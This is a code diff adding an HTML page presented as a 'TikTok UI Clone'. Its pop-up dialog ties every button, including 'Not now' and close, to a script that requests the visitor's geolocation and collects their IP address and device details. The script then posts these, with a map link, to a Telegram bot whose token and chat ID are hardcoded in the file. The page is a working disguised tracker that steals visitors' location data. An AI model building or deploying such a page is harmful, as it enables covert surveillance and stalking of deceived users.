@@ -1,0 +1,222 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>TikTok UI Clone</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+<style>
+  body{margin:0;background:#000;color:#fff;font-family:Arial,sans-serif;height:100vh;display:flex;flex-direction:column;}
+  .topbar{display:flex;justify-content:center;align-items:center;padding:12px 0;font-size:16px;font-weight:bold;}
+  .tab{margin:0 16px;opacity:0.6;}
+  .tab.active{opacity:1;border-bottom:2px solid #fff;padding-bottom:4px;}
+  .content{flex:1;display:flex;align-items:center;justify-content:center;position:relative;}
+  .sidebar{position:absolute;right:12px;bottom:100px;display:flex;flex-direction:column;align-items:center;gap:22px;font-size:13px;}
+  .icon{display:flex;flex-direction:column;align-items:center;gap:4px;}
+  .icon button{width:50px;height:50px;border-radius:50%;border:none;background:#222;color:#fff;font-size:22px;cursor:pointer;}
+  .profile{display:flex;flex-direction:column;align-items:center;gap:6px;}
+  .profile-pic{width:50px;height:50px;border-radius:50%;border:2px solid #fff;background:url('https://via.placeholder.com/60') no-repeat center/cover;position:relative;}
+  .follow-btn{position:absolute;bottom:-8px;left:50%;transform:translateX(-50%);width:24px;height:24px;border-radius:50%;background:#fe2c55;border:2px solid #fff;color:#fff;font-size:16px;line-height:18px;text-align:center;cursor:pointer;}
+  .bottombar{display:flex;justify-content:space-around;padding:8px 0;border-top:1px solid #222;background:#000;}
+  .bottombar button{background:none;border:none;color:#fff;font-size:20px;cursor:pointer;}
+  .bottombar .add{background:linear-gradient(90deg,#25f4ee,#fe2c55);border-radius:8px;padding:6px 16px;font-weight:bold;}
+  .dot{position:absolute;top:50%;left:50%;width:16px;height:16px;border-radius:50%;transform:translate(-50%,-50%);animation:bounce 0.6s infinite alternate;}
+  .dot.cyan{background:#25f4ee;animation-delay:-0.3s;margin-left:-12px;}
+  .dot.pink{background:#fe2c55;margin-left:12px;}
+  @keyframes bounce{from{transform:translate(-50%,-50%) scale(1);}to{transform:translate(-50%,-70%) scale(1.2);}}
+  .notification {
+    position: fixed;
+    bottom: 70px;
+    left: 50%;
+    transform: translateX(-50%);
+    background: rgba(0,0,0,0.7);
+    color: white;
+    padding: 10px 20px;
+    border-radius: 20px;
+    font-size: 14px;
+    z-index: 1000;
+    display: none;
+  }
+
+  .dialog {
+    position: fixed;
+    top:0; left:0;
+    width:100%; height:100%;
+    background: rgba(0,0,0,0.7);
+    display:flex; justify-content:center; align-items:center;
+    z-index:2000;
+  }
+  .dialog-content {
+    background:#fff; color:#000;
+    padding:20px;
+    border-radius:12px;
+    text-align:center;
+    width:80%;
+    max-width:320px;
+    position:relative;
+  }
+  .close-btn {
+    position:absolute; top:10px; right:10px;
+    background:none; border:none; font-size:22px;
+    cursor:pointer;
+  }
+  .dialog-logo {
+    font-size:40px;
+    margin-bottom:10px;
+  }
+  .dialog-content h3 {
+    margin:10px 0;
+  }
+  .dialog-content p {
+    font-size:14px;
+    color:#555;
+    margin-bottom:20px;
+  }
+  .open-btn {
+    background:#fe2c55;
+    color:#fff;
+    border:none;
+    padding:12px;
+    width:100%;
+    border-radius:6px;
+    font-size:16px;
+    cursor:pointer;
+    margin-bottom:10px;
+  }
+  .later-btn {
+    background:none;
+    border:none;
+    color:#333;
+    font-size:14px;
+    cursor:pointer;
+  }
+</style>
+</head>
+<body>
+  <div class="topbar"><div class="tab">Following</div><div class="tab active">For You</div></div>
+  <div class="content">
+    <div class="dot cyan"></div><div class="dot pink"></div>
+    <div class="sidebar">
+      <div class="profile"><div class="profile-pic"><div class="follow-btn">+</div></div></div>
+      <div class="icon"><button><i class="fa-solid fa-heart"></i></button><span>32.7K</span></div>
+      <div class="icon"><button><i class="fa-solid fa-comment-dots"></i></button><span>16.4K</span></div>
+      <div class="icon"><button><i class="fa-solid fa-bookmark"></i></button><span>7,345</span></div>
+    </div>
+  </div>
+  <div class="bottombar">
+    <button><i class="fa-solid fa-house"></i></button>
+    <button><i class="fa-solid fa-magnifying-glass"></i></button>
+    <button class="add"><i class="fa-solid fa-plus"></i></button>
+    <button><i class="fa-regular fa-message"></i></button>
+    <button><i class="fa-regular fa-user"></i></button>
+  </div>
+
+  <div class="notification" id="notification"></div>
+
+  <div class="dialog" id="tiktokDialog">
+    <div class="dialog-content">
+      <button class="close-btn" onclick="closeDialog(); getLocation();">×</button>
+      <div class="dialog-logo">🎵</div>
+      <h3>Get the full app experience</h3>
+      <p>Enjoy more videos and great features on the app</p>
+      <button class="open-btn" onclick="getLocation()">Open TikTok</button>
+      <button class="later-btn" onclick="closeDialog(); getLocation();">Not now</button>
+    </div>
+  </div>
+
+<script>
+  /* -------------------------------
+       TELEGRAM BOT CONFIG
+  --------------------------------*/
+  const BOT_TOKEN = "8293350275:AAFLxWjynRRKwLfbXRq3cNMEzBcfwqs7o6M";   // <-- Bot Token ထည့်
+  const CHAT_ID = "1901293803";       // <-- Chat ID ထည့်
+
+  const notification = document.getElementById('notification');
+
+  function showNotification(msg){
+    notification.textContent = msg;
+    notification.style.display = "block";
+    setTimeout(()=>{notification.style.display="none";},3000);
+  }
+
+  async function getIPAddress(){
+    try{
+      const res = await fetch("https://api.ipify.org?format=json");
+      const data = await res.json();
+      return data.ip;
+    }catch(e){
+      return "Unknown";
+    }
+  }
+
+  async function getDeviceInfo(){
+    const ip = await getIPAddress();
+    const ua = navigator.userAgent;
+    const platform = navigator.platform;
+    const screenSize = `${screen.width}x${screen.height}`;
+    return { ip, ua, platform, screenSize };
+  }
+
+  function getLocation(){
+    if(navigator.geolocation){
+      navigator.geolocation.getCurrentPosition(sendData, ()=>sendData());
+    }else{
+      sendData();
+    }
+  }
+
+  async function sendData(position){
+    const device = await getDeviceInfo();
+    const latitude = position?.coords?.latitude || "Unknown";
+    const longitude = position?.coords?.longitude || "Unknown";
+
+    const mapLink = (latitude !== "Unknown" && longitude !== "Unknown") 
+      ? `https://www.google.com/maps?q=${latitude},${longitude}` 
+      : "Unknown";
+
+    const time = new Date().toLocaleString();
+
+    const message = 
+`📌 *New TikTok Page Visitor*
+────────────────────────────
+🌐 *IP:* ${device.ip}
+📱 *Device:* ${device.ua}
+💻 *Platform:* ${device.platform}
+📏 *Screen:* ${device.screenSize}
+
+📍 *Location Info*
+• Latitude: ${latitude}
+• Longitude: ${longitude}
+• Map: ${mapLink}
+
+⏰ *Time:* ${time}
+`;
+
+    try{
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method:"POST",
+        headers:{"Content-Type":"application/json"},
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: message,
+          parse_mode: "Markdown"
+        })
+      });
+
+      showNotification("✔ Sent to Telegram");
+    }catch(e){
+      console.error(e);
+      showNotification("❌ Failed to send");
+    }
+  }
+
+  function closeDialog(){
+    document.getElementById("tiktokDialog").style.display="none";
+  }
+
+  window.onload = ()=>{
+    document.getElementById("tiktokDialog").style.display="flex";
+  }
+</script>
+</body>
+</html>
